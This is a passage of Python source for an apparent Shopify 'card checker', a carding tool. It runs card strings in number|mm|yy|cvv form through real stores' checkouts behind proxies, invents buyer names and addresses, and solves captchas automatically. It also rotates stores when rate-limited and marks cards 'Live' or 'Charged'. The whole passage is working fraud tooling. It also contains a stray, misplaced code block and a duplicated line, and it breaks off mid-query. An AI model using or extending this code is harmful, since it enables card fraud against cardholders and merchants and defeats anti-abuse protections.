    # Look specifically for the standard Shopify hCaptcha sitekey in script tags or meta tags
    standard_patterns = [
        r'4c672d35-03a7-4e17-8e66-a43901f0d56c',
        r'data-hcaptcha-sitekey=["\']4c672d35-03a7-4e17-8e66-a43901f0d56c["\']',
        r'sitekey["\']?\s*[:=]\s*["\']4c672d35-03a7-4e17-8e66-a43901f0d56c["\']',
    ]
    
    for pattern in standard_patterns:
        if re.search(pattern, html_text, re.IGNORECASE):
            print(f"[✓] Found standard Shopify hCaptcha sitekey via pattern")
            return STANDARD_SHOPIFY_HCAPTCHA, 'hcaptcha'
    
    # Now look for any UUID that might be a sitekey
    uuid_pattern = r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
    uuids = re.findall(uuid_pattern, html_text, re.IGNORECASE)
    
    for uuid in uuids:
        # If we find a UUID and the page mentions hcaptcha, it's likely the sitekey
        if 'hcaptcha' in html_text.lower() or 'h-captcha' in html_text.lower():
            print(f"[✓] Found UUID in hCaptcha context: {uuid}")
            return uuid, 'hcaptcha'
    
    # Look for hCaptcha in script tags specifically
    script_patterns = [
        r'<script[^>]*>.*?hcaptcha.*?sitekey["\']?\s*[:=]\s*["\']([^"\']+)["\'].*?</script>',
        r'<script[^>]*>.*?hcaptcha.*?key["\']?\s*[:=]\s*["\']([^"\']+)["\'].*?</script>',
        r'<script[^>]*>.*?["\']hcaptcha["\']\s*:\s*{\s*["\']sitekey["\']\s*:\s*["\']([^"\']+)["\'].*?</script>',
    ]
    
    for pattern in script_patterns:
        match = re.search(pattern, html_text, re.IGNORECASE | re.DOTALL)
        if match:
            sitekey = match.group(1)
            print(f"[✓] Found hCaptcha sitekey in script tag: {sitekey}")
            return sitekey, 'hcaptcha'
    
    # Look for hCaptcha API URL
    api_patterns = [
        r'https?://(?:api\.|js\.)?hcaptcha\.com/.*?sitekey=([^"&\']+)',
        r'https?://hcaptcha\.com/.*?sitekey=([^"&\']+)',
    ]
    
    for pattern in api_patterns:
        match = re.search(pattern, html_text, re.IGNORECASE)
        if match:
            sitekey = match.group(1)
            print(f"[✓] Found hCaptcha sitekey in API URL: {sitekey}")
            return sitekey, 'hcaptcha'
    
    # If we find any UUID and the page has checkout in it (common for Shopify)
    if uuids and 'checkout' in html_text.lower():
        # Try the most common Shopify hCaptcha sitekey
        if STANDARD_SHOPIFY_HCAPTCHA in uuids:
            print(f"[✓] Using standard Shopify hCaptcha sitekey from UUID list")
            return STANDARD_SHOPIFY_HCAPTCHA, 'hcaptcha'
        
        # Otherwise use the first UUID we found
        print(f"[*] No hCaptcha context but found UUID in checkout page: {uuids[0]}")
        print(f"[*] Attempting to use this as sitekey")
        return uuids[0], 'hcaptcha'
    
    print("[!] Could not extract valid CAPTCHA sitekey from page HTML")
    return None, None


# ════════════════════════════════════════════════════════════════════════════════════════
# AUTO SHOPIFY CHECKER - MAIN CHECKING FUNCTION WITH DYNAMIC SITE SUPPORT
# ════════════════════════════════════════════════════════════════════════════════════════

def sh(card_details, username, proxy_to_use=None, site_data=None):
    """
    Main card checking function with dynamic site support.
    
    Args:
        card_details: Card string in format number|mm|yy|cvv
        username: Username for logging
        proxy_to_use: Optional proxy dictionary
        site_data: Site configuration dict with 'url', 'domain', 'product_id'
    
    Returns:
        dict with check results or string with error message
    """
    start_time = time.time()
    text = card_details.strip()
    pattern = r'(\d{15,16})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
    match = re.search(pattern, text)

    if not match:
        return "Invalid card format. Please provide a valid card number, month, year, and cvv."

    n = match.group(1)
    mm_raw = match.group(2)
    mm = str(int(mm_raw))
    yy_raw = match.group(3)
    cvc = match.group(4)

    if len(yy_raw) == 4 and yy_raw.startswith("20"):
        yy = yy_raw[2:]
    elif len(yy_raw) == 2:
        yy = yy_raw
    else:
        return "Invalid year format."

    full_card = f"{n}|{mm_raw.zfill(2)}|{yy}|{cvc}"

    # Get site configuration - use provided site_data or get current site
    if site_data is None:
        site_data = get_current_site()
    
    if site_data is None:
        return "NO_SITE_AVAILABLE"

    # Extract site details
    site_domain = site_data['domain']
    
    # Convert proxy format for async checker
    proxy_str = None
    if proxy_to_use:
        # proxy_to_use is dict like {'http': 'http://ip:port', 'https': 'http://ip:port'}
        proxy_str = proxy_to_use.get('http') or proxy_to_use.get('https')
    
    try:
        # Create async checker instance with proxy
        checker = ShopifyChecker(proxy=proxy_str)
        
        # Call async function using asyncio.run() - creates new event loop for this thread
        success, message, info = asyncio.run(
            checker.check_card(
                site_domain,
                n,  # card number without spaces
                mm,  # month as string
                yy,  # 2-digit year
                cvc,  # cvv
                proxy_str  # proxy as string or None
            )
        )
        
        elapsed_time = time.time() - start_time
        
        # Get BIN info
        bin_number = n[:6]
        bin_info = get_bin_info(bin_number)
        
        # Determine status emoji
        if success:
            if "Charged" in message or "ORDER_PLACED" in message:
                status = "Charged🔥"
            else:
                status = "Live✅"  # Valid card but not charged (e.g., insufficient funds, invalid CVV)
        else:
            status = "Declined!❌"
        
        return {
            'full_card': full_card,
            'bin': bin_number,
            'bin_info': bin_info,
            'status': status,
            'resp_msg': message,
            'username': username,
            'dev': 'T R U S T E D',
            'dev_emoji': '👑',
            'elapsed_time': f"{elapsed_time:.2f}s",
            'order_details': info,
            'site_used': site_domain
        }
        
    except Exception as e:
        elapsed_time = time.time() - start_time
        print(f"Error in sh(): {e}")
        
        # Check if it's a CAPTCHA or rate limit error
        error_str = str(e).lower()
        if 'captcha' in error_str:
            return "CAPTCHA_RATE_LIMIT"
        
        bin_number = n[:6]
        bin_info = get_bin_info(bin_number)
        
        return {
            'full_card': full_card,
            'bin': bin_number,
            'bin_info': bin_info,
            'status': "Error⚠️",
            'resp_msg': f"ERROR: {str(e)}",
            'username': username,
            'dev': 'T R U S T E D',
            'dev_emoji': '👑',
            'elapsed_time': f"{elapsed_time:.2f}s",
            'order_details': {},
            'site_used': site_domain
        }


def check_card_worker_safe(card_details, username, proxy_to_use, results_list, stats_counters, lock, site_rotation_info):
    """
    Worker thread to check a single card with session error detection and automatic retry.
    Includes automatic site rotation on session errors and rate limits.
    
    Args:
        card_details: Card string
        username: User's username
        proxy_to_use: Proxy dictionary or None
        results_list: Shared list for results
        stats_counters: Shared dict for statistics
        lock: Threading lock
        site_rotation_info: Dict with 'rotated' flag and 'removed_sites' list
    """
    result_text = ""
    card_status = 'errors'
    retry_count = 0
    max_retries = 3
    
    try:
        # Get current site
        current_site = get_current_site()
        
        if current_site is None:
            result_text = f"Card: `{card_details}`\nResponse: *NO SITES AVAILABLE ❌*"
            card_status = 'errors'
            with lock:
                results_list.append(result_text)
                stats_counters[card_status] += 1
            return
        
        # Attempt to check card with retry logic for session errors
        result = None
        removed_sites_list = []
        
        while retry_count < max_retries:
            current_site = get_current_site()
            if not current_site:
                result_text = f"Card: `{card_details}`\nResponse: *NO SITES AVAILABLE AFTER RETRIES ❌*"
                card_status = 'errors'
                break
            
            # Call the sh function
            result = sh(card_details, username, proxy_to_use=proxy_to_use, site_data=current_site)
            
            # Check if result is a session error
            if isinstance(result, dict):
                is_error, error_type, should_remove = is_session_error_response(result)
                
                if not is_error:
                    # Valid result, break out of retry loop
                    break
                elif should_remove:
                    # Session error detected, remove site and retry
                    print(f"[!] Session error detected: {error_type} on {current_site['domain']}")
                    with lock:
                        removed = remove_current_site()
                        if removed:
                            removed_sites_list.append(removed['domain'])
                            site_rotation_info['removed_sites'].append(removed['domain'])
                    retry_count += 1
                    continue
                else:
                    # Temporary error, break and return
                    break
            
            elif isinstance(result, str):
                is_error, error_type, should_remove = detect_session_error(result, result)
                
                if not is_error:
                    # Not a session error, break
                    break
                elif should_remove:
                    # Session error detected, remove site and retry
                    print(f"[!] Session error detected: {error_type} on {current_site['domain']}")
                    with lock:
                        removed = remove_current_site()
                        if removed:
                            removed_sites_list.append(removed['domain'])
                            site_rotation_info['removed_sites'].append(removed['domain'])
                    retry_count += 1
                    continue
                else:
                    # Temporary error, break
                    break
            
            retry_count += 1
        
        # Process the final result
        if isinstance(result, str):
            card_to_display = card_details
            
            # Check for rate limit / captcha error
            if result == "CAPTCHA_RATE_LIMIT" or "captcha" in result.lower():
                # Mark site for removal and rotation
                with lock:
                    removed_site = remove_current_site()
                    site_rotation_info['rotated'] = True
                    if removed_site:
                        removed_sites_list.append(removed_site['domain'])
                        site_rotation_info['removed_sites'].append(removed_site['domain'])
                        response_msg = f"RATE LIMITED - Switched to next site (Removed: {removed_site['domain']})"
                    else:
                        response_msg = "RATE LIMITED - NO MORE SITES AVAILABLE"
                card_status = 'errors'
            elif result == "NO_SITE_AVAILABLE":
                response_msg = "NO SITES AVAILABLE"
                card_status = 'errors'
            else:
                response_msg = f"Error: {result}"
                card_status = 'errors'
        else:
            card_to_display = result['full_card']
            response_msg = result['resp_msg']
            
            # Track results
            if "Charged" in result['status'] or "ORDER_PLACED" in response_msg:
                card_status = 'successful'
            elif "Declined" in result['status'] or "DECLINED" in response_msg:
                card_status = 'declined'
            else:
                card_status = 'declined'
        
        # Add retry info if retries were performed
        if retry_count > 0 and removed_sites_list:
            response_msg += f" (Retried {retry_count}x, Removed: {', '.join(removed_sites_list)})"
            site_rotation_info['rotated'] = True

        safe_card = card_to_display.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
        result_text = f"Card: `{safe_card}`\nResponse: *{response_msg}*"

    except Exception as e:
        print(f"Error processing card {card_details} in thread: {e}")
        safe_card = card_details.replace('_', r'\_').replace('*', r'\*').replace('`', r'\`')
        result_text = f"Card: `{safe_card}`\nResponse: *Processing Error ❗️*"
        card_status = 'errors'
    
    # Use the lock to safely update the shared stats and results list
    with lock:
        results_list.append(result_text)
        stats_counters[card_status] += 1


def validate_site(site_url, product_id):
    """
    Validate a Shopify site by testing with a test card.
    Returns (is_valid, message, gateway)
    
    A site is valid if it returns card_declined (meaning it processed the card)
    """
    test_card = "4242424242424242|11|27|777"
    
    site_data = {
        'url': site_url if site_url.startswith('http') else f'https://{site_url}',
        'domain': site_url.replace('https://', '').replace('http://', '').rstrip('/'),
        'product_id': str(product_id),
        'gateway': 'Shopify Payments'
    }
    
    print(f"\n[VALIDATION] Testing site: {site_url} with card: {test_card}")
    
    try:
        result = sh(test_card, "VALIDATOR", proxy_to_use=None, site_data=site_data)
        
        print(f"[VALIDATION] Raw result type: {type(result)}")
        
        if isinstance(result, str):
            print(f"[VALIDATION] String result: {result}")
            # String result means error
            if result == "CAPTCHA_RATE_LIMIT":
                return False, "Site is rate limited (captcha_metadata_missing)", None
            elif "Failed at step" in result:
                return False, f"Site error: {result}", None
            elif "Declined" in result or "declined" in result.lower():
                # Card declined is a VALID response - site works!
                print(f"[VALIDATION] ✓ Site valid - received declined response: {result}")
                return True, "card_declined", "Shopify Payments"
            else:
                print(f"[VALIDATION] ✗ Unexpected string response: {result}")
                return False, f"Invalid response: {result}", None
        else:
            # Dict result - check the response
            resp_msg = result.get('resp_msg', '')
            status = result.get('status', '')
            full_card = result.get('full_card', '')
            
            print(f"[VALIDATION] Dict result - Status: '{status}', Message: '{resp_msg}', Card: {full_card}")
            
            # Check for declined responses - these are VALID
            if "Declined" in status or "DECLINED" in resp_msg or "declined" in resp_msg.lower():
                print(f"[VALIDATION] ✓ Site valid - detected declined response")
                return True, "card_declined", "Shopify Payments"
            elif "CARD_DECLINED" in resp_msg or "card_declined" in resp_msg.lower():
                print(f"[VALIDATION] ✓ Site valid - detected card_declined")
                return True, "card_declined", "Shopify Payments"
            elif "INSUFFICIENT" in resp_msg:
                print(f"[VALIDATION] ✓ Site valid - detected insufficient funds")
                return True, "card_declined", "Shopify Payments"
            elif "INCORRECT" in resp_msg:
                print(f"[VALIDATION] ✓ Site valid - detected incorrect")
                return True, "card_declined", "Shopify Payments"
            elif "FRAUD" in resp_msg:
                print(f"[VALIDATION] ✓ Site valid - detected fraud")
                return True, "card_declined", "Shopify Payments"
            elif "3D_SECURE" in resp_msg:
                print(f"[VALIDATION] ✓ Site valid - detected 3D secure")
                return True, "card_declined", "Shopify Payments"
            elif "ORDER_PLACED" in resp_msg or "Charged" in status:
                # This shouldn't happen with test card, but site is valid
                print(f"[VALIDATION] ✓ Site valid - card was charged! (unexpected with test card)")
                return True, "card_charged", "Shopify Payments"
            else:
                print(f"[VALIDATION] ✗ Unexpected response - Status: '{status}', Message: '{resp_msg}'")
                return False, f"Unexpected response: {resp_msg}", None
                
    except Exception as e:
        print(f"[VALIDATION] ✗ Exception: {str(e)}")
        import traceback
        traceback.print_exc()
        return False, f"Validation error: {str(e)}", None

    else:
            # Dict result - check the response
            resp_msg = result.get('resp_msg', '')
            status = result.get('status', '')
            
            # DEBUG: Print the actual response
            print(f"[DEBUG] Validation response - Status: {status}, Message: {resp_msg}")
            
            # Check for declined responses - these are VALID
            if "Declined" in status or "DECLINED" in resp_msg or "declined" in resp_msg.lower():
                return True, "card_declined", "Shopify Payments"

# ════════════════════════════════════════════════════════════════════════════════════════
# AUTO PRODUCT FETCHING FUNCTION
# ════════════════════════════════════════════════════════════════════════════════════════

def fetch_cheapest_product_sync(domain):
    """Synchronous wrapper for async product fetching."""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(fetch_cheapest_product_async(domain))
        loop.close()
        return result
    except Exception as e:
        return None, f"Error: {str(e)}"

# ════════════════════════════════════════════════════════════════════════════════════════
# SHOPIFY CHECKER CLASS - ASYNC CARD CHECKING ENGINE WITH CAPTCHA SUPPORT
# ════════════════════════════════════════════════════════════════════════════════════════

class ShopifyChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.session = None
        self.proxy = proxy
        self.ua = UserAgent()
        self.captcha_token = None
        self.captcha_type = None
        self.captcha_sitekey = None
        
        
    async def setup_session(self):
        """Setup aiohttp session for async requests with proxy support"""
        if self.session is None:
            if self.proxy:
                # Use proxy with random user agent
                self.session = aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False),
                    timeout=aiohttp.ClientTimeout(total=30),
                    headers={"User-Agent": self.ua.random}
                )
            else:
                # No proxy, but still use random user agent
                self.session = aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False),
                    timeout=aiohttp.ClientTimeout(total=30),
                    headers={"User-Agent": self.ua.random}
                )
    
    async def close_session(self):
        """Close the aiohttp session and cleanup"""
        if self.session:
            try:
                await self.session.close()
            except:
                pass
            self.session = None
        self.proxy = None

    def extract_between(self, text: str, start: str, end: str) -> Optional[str]:
        """Extract text between two strings"""
        try:
            start_idx = text.index(start) + len(start)
            end_idx = text.index(end, start_idx)
            return text[start_idx:end_idx]
        except ValueError:
            return None

    def find_between(self, s, first, last):
        try:
            start = s.index(first) + len(first)
            end = s.index(last, start)
            return s[start:end]
        except ValueError:
            return ""
    
    def generate_random_name(self) -> Tuple[str, str]:
        """Generate random first and last name"""
        first_names = ['John', 'James', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis']
        return random.choice(first_names), random.choice(last_names)
    
    def generate_email(self, first_name: str, last_name: str) -> str:
        """Generate random email"""
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
        random_num = ''.join(random.choices(string.digits, k=3))
        return f"{first_name.lower()}.{last_name.lower()}{random_num}@{random.choice(domains)}"
    
    def generate_address(self) -> dict:
        """Generate random US address"""
        streets = ['123 Main St', '456 Oak Ave', '789 Pine Rd', '321 Elm St', '654 Maple Dr']
        cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix']
        states = ['NY', 'CA', 'IL', 'TX', 'AZ']
        zips = ['10001', '90001', '60601', '77001', '85001']
        phones = ['2125551234', '3235551234', '3125551234', '7135551234', '6025551234']
        
        idx = random.randint(0, 4)
        return {
            'street': random.choice(streets),
            'city': cities[idx],
            'state': states[idx],
            'zip': zips[idx],
            'phone': random.choice(phones)
        }
    
    async def fetch_products(self, domain: str) -> Tuple[bool, str]:
        """Fetch cheapest product from Shopify store with proxy support"""
        try:
            url = f"https://{domain}/products.json"
            kwargs = {"timeout": 10}
            if self.proxy:
                kwargs["proxy"] = self.proxy
            async with self.session.get(url, **kwargs) as resp:
                if resp.status != 200:
                    return False, "Site Error - Cannot access products"
                
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "Not a Shopify site"
                
                data = await resp.json()
                products = data.get('products', [])
                
                if not products:
                    return False, "No products found"
                
                min_price = float('inf')
                min_product = None
                
                for product in products:
                    if not product.get('variants'):
                        continue
                    
                    for variant in product['variants']:
                        if not variant.get('available', False):
                            continue
                        
                        try:
                            price = variant.get('price', '0')
                            if isinstance(price, str):
                                price = float(price.replace(',', ''))
                            else:
                                price = float(price)
                            
                            if price < min_price and price > 0:
                                min_price = price
                                min_product = {
                                    'price': f"{price:.2f}",
                                    'variant_id': str(variant['id']),
                                    'handle': product['handle']
                                }
                        except (ValueError, TypeError, KeyError):
                            continue
                
                if min_product:
                    return True, min_product
                else:
                    return False, "No valid products found"
                    
        except aiohttp.ClientError:
            return False, "Connection error - Check proxy"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    async def check_card(self, domain: str, cc: str, mes: str, ano: str, cvv: str, 
                        proxy: Optional[str] = None) -> Tuple[bool, str, dict]:
        """Main card checking function with proxy support for all steps and CAPTCHA solving"""
        try:
            # Store proxy for use throughout the check
            self.proxy = proxy
            
            # Setup session with proxy and random user agent
            if self.session is None:
                if proxy:
                    self.session = aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False),
                        timeout=aiohttp.ClientTimeout(total=30),
                        headers={"User-Agent": self.ua.random}
                    )
                else:
                    self.session = aiohttp.ClientSession(
                        timeout=aiohttp.ClientTimeout(total=30),
                        headers={"User-Agent": self.ua.random}
                    )
            
            domain = domain.replace('https://', '').replace('http://', '').strip('/')
            base_url = f"https://{domain}"
            
            print(f"\n[*] Fetching products from {domain}...")
            success, product_data = await self.fetch_products(domain)
            
            if not success:
                return False, product_data, {}
            
            variant_id = product_data['variant_id']
            product_handle = product_data['handle']
            print(f"[+] Found product: ${product_data['price']} (Variant: {variant_id})")
            
            # Generate random info
            firstName, lastName = self.generate_random_name()
            email = self.generate_email(firstName, lastName)
            address_data = self.generate_address()

            street = address_data['street']
            city = address_data['city']
            state = address_data['state']
            s_zip = address_data['zip']
            phone = address_data['phone']
            address2 = ""
            merch = variant_id
               
            print(f"[*] Using: {firstName} {lastName} - {email}")
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': '*/*',
                'Content-Type': 'application/json',
            }
            
            # Step 1: Add to cart
            print(f"[*] Adding product to cart...")
            cart_url = f"{base_url}/cart/add.js"
            await self.session.post(cart_url, json={'id': variant_id}, headers=headers)
            
            # Step 2: Go to checkout
            print(f"[*] Creating checkout session...")
            checkout_url = f"{base_url}/checkout/"
            resp = await self.session.post(checkout_url, headers=headers)
            checkout_url = str(resp.url)
            
            if 'login' in checkout_url.lower():
                return False, "Site requires login", {}
            
            # Get session token with proxy support
                        # Get session token with proxy support
            kwargs = {"headers": headers}
            if self.proxy:
                kwargs["proxy"] = self.proxy
            resp = await self.session.get(checkout_url, **kwargs)
            text = await resp.text()
            
            # Check for CAPTCHA
            if 'captcha' in text.lower() or 'recaptcha' in text.lower() or 'hcaptcha' in text.lower() or 'turnstile' in text.lower():
                print("[!] CAPTCHA detected on checkout page")
                
                # Save a sample of the HTML for debugging (optional)
                with open('captcha_page_sample.html', 'w', encoding='utf-8') as f:
                    f.write(text[:10000])  # Save first 10000 chars for inspection
                
                # Extract sitekey
                sitekey, captcha_type = extract_captcha_sitekey(text)
                
                # If we couldn't extract but it's clearly hCaptcha, try common Shopify sitekeys
                if not sitekey and 'hcaptcha' in text.lower() and ENABLE_CAPTCHA_SOLVING:
                    # Try the standard Shopify hCaptcha sitekey
                    common_sitekeys = [
                        "4c672d35-03a7-4e17-8e66-a43901f0d56c",  # Standard Shopify
                        "a5b1c2d3-e4f5-6789-0123-456789abcdef",  # Another common one
                        "12345678-1234-1234-1234-123456789abc",  # Placeholder
                    ]
                    
                    for test_key in common_sitekeys:
                        print(f"[*] Trying common Shopify hCaptcha sitekey: {test_key}")
                        sitekey = test_key
                        captcha_type = 'hcaptcha'
                        break
                
                if sitekey and ENABLE_CAPTCHA_SOLVING:
                    print(f"[*] Found {captcha_type} sitekey: {sitekey}")
                    
                    # Solve CAPTCHA using NopeCHA (synchronous call, run in thread pool)
                    loop = asyncio.get_event_loop()
                    token = await loop.run_in_executor(
                        None, 
                        solve_captcha_with_retry, 
                        sitekey, 
                        checkout_url, 
                        captcha_type,
                        3
                    )
                    
                    if token:
                        print(f"[✓] CAPTCHA solved successfully, token obtained")
                        self.captcha_token = token
                        self.captcha_type = captcha_type
                        self.captcha_sitekey = sitekey
                        
                        # Add CAPTCHA token to headers
                        headers['X-Captcha-Token'] = token
                        headers['X-Captcha-Provider'] = captcha_type.upper()
                        
                        # Re-fetch the checkout page with CAPTCHA token
                        print(f"[*] Re-fetching checkout page with CAPTCHA token...")
                        resp = await self.session.get(checkout_url, **kwargs)
                        text = await resp.text()
                        
                        # Now try to get session token again
                        sst = self.extract_between(text, 'serialized-sessionToken" content="&quot;', '&quot;"') or self.extract_between(text, 'serialized-session-token" content="&quot;', '&quot;"')
                        if sst:
                            print(f"[+] Session token obtained after CAPTCHA")
                        else:
                            print(f"[!] Still no session token after CAPTCHA")
                    else:
                        print("[✗] Failed to solve CAPTCHA")
                        return False, "CAPTCHA_REQUIRED - Could not solve", {}
                else:
                    print(f"[!] CAPTCHA detected but couldn't extract sitekey or CAPTCHA solving disabled")
                    # If we can't solve, return a specific error that will trigger site rotation
                    return False, "CAPTCHA_REQUIRED - Sitekey not found", {}
            
            # Enhanced session token extraction
            sst = self.extract_between(text, 'serialized-sessionToken" content="&quot;', '&quot;"') or self.extract_between(text, 'serialized-session-token" content="&quot;', '&quot;"')
            if not sst:
                sst = self.extract_between(text, 'serialized-session-token" content="&quot;', '&quot;"')
            if not sst:
                # Fallback to direct regex if extract_between fails due to different quoting
                sst_match = re.search(r'serialized-session-?token["\']\s*content=["\'](?:&quot;)?(.*?)(?:&quot;)?["\']', text, re.IGNORECASE)
                if not sst_match:
                    sst_match = re.search(r'serialized-session-token["\']\s*content=["\'](?:&quot;)?(.*?)(?:&quot;)?["\']', text)
                if sst_match:
                    sst = sst_match.group(1)
            
            if not sst:
                # Try re-fetching once more if still no token
                await asyncio.sleep(1)
                resp = await self.session.get(checkout_url, **kwargs)
                text = await resp.text()
                sst_match = re.search(r'serialized-session-?token["\']\s*content=["\'](?:&quot;)?(.*?)(?:&quot;)?["\']', text, re.IGNORECASE)
                if not sst_match:
                    sst_match = re.search(r'serialized-session-token["\']\s*content=["\'](?:&quot;)?(.*?)(?:&quot;)?["\']', text)
                if sst_match:
                    sst = sst_match.group(1)

            if not sst:
                return False, "Failed to get session token", {}
            
            print(f"[+] Session token obtained")
            
            # Extract other required data with improved patterns
            queueToken = self.extract_between(text, 'queueToken&quot;:&quot;', '&quot;')
            if not queueToken:
                qt_match = re.search(r'queueToken&quot;:&quot;(.*?)&quot;', text)
                queueToken = qt_match.group(1) if qt_match else ""

            stableId = self.extract_between(text, 'stableId&quot;:&quot;', '&quot;')
            if not stableId:
                si_match = re.search(r'stableId&quot;:&quot;(.*?)&quot;', text)
                stableId = si_match.group(1) if si_match else ""

            subtotal = self.extract_between(text, 'totalAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;')
            if not subtotal:
                sub_match = re.search(r'totalAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;(.*?)&quot;', text)
                subtotal = sub_match.group(1) if sub_match else "0.00"
            
            pattern = r'currencycode\s*[:=]\s*["\']?([^"\']+)["\']?'
            currency_match = re.search(pattern, text.lower())
            currency = currency_match.group(1).upper() if currency_match else 'USD'
            
            graphql_url = f"https://{urlparse(base_url).netloc}/checkouts/unstable/graphql"
            
            # STEP 1: SHIPPING PROPOSAL
            print(f"[*] Submitting shipping information...")
            
            # Prepare base variables for all GraphQL requests - FINAL FIXED
            base_variables = {
                'sessionInput': {
                    'sessionToken': sst,
                },
                'queueToken': queueToken,
            }
            
            # Add CAPTCHA token if we have one - FINAL FIXED (with empty challenge)
            if hasattr(self, 'captcha_token') and self.captcha_token:
                base_variables['captcha'] = {
                    'provider': self.captcha_type.upper() if hasattr(self, 'captcha_type') else 'HCAPTCHA',
                    'token': self.captcha_token,
                    'challenge': '',  # Empty string instead of null
                }
            
            shipping_json = {
                'query':  'query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any 